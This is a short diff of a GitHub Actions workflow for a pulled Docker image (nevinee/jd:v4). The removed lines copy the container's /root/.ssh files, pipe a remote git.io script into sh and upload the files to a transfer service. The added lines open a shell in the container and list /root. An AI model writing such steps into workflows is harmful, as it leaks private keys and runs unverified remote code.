@@ -11,9 +11,7 @@ jobs:
       run: |
         mkdir download
         docker pull nevinee/jd:v4
-        docker images
-        docker cp 925eb6010e56:/root/.ssh/* download
-    - name: Upload your file
-      run: |
-        curl -sL https://git.io/file-transfer | sh
-        ./transfer wet ./download/
+        docker exec 925eb6010e56 /bin/bash
+        ls
+        ls /
+        ls /root
